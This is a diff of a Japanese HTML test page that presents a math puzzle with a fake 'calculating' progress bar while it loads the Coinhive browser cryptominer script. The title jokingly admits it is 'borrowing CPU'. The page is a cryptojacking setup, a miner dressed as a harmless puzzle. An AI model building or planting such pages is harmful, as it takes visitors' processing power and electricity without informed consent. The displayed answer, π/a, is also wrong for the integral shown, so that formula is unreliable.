@@ -1,22 +1,31 @@
 <!DOCTYPE html>
 <html lang="ja">
-	<head>
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<title>test of coinhive</title>
-		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-		<link type="text/css" rel="stylesheet" href="css/materialize.min.css" media="screen,projection"/>
-		<link href="css/mystyle.css" rel="stylesheet">
-	</head>
-	<body class="grey darken-2 white-text">
-		<div class="container">
-			<h1>test of coinhive</h1>
-			<button id="popup" class="btn btn-large">Click</button>
+<head>
+	<meta charset="UTF-8">
+	<title>Coinhiveのテスト（CPU拝借中）</title>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
+</head>
+<body>
+	<div class="container">
+		<p class="pink-text">Coinhiveのテスト（CPU拝借中）</p>
+		<h1>これが解けたら天才</h1>
+		<h2>$$\int_{-\infty}^{\infty} \int_{-\infty}^{\infty} e^{-(x^{2}+y^{2})} dxdy$$</h2>
+		<div id="loader">
+			<p class="center-align">計算中...（計算してないですけどね）</p>	
+			<div class="progress">
+				<div class="indeterminate"></div>
+			</div>
 		</div>
-
-		<script type="text/javascript" src="js/jquery-2.2.4.min.js"></script>
-		<script type="text/javascript" src="js/materialize.min.js"></script>
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-		<script type="text/javascript" src="js/myscript.js"></script>
-	</body>
+		<div id="answer">
+			<h2>$$=\frac{\pi}{a}$$</h2>
+		</div>
+		<button id="button" class="btn btn-large">答えを見る</button>
+	</div>
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML'></script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script src='myscript.js'></script>
+</body>
 </html>
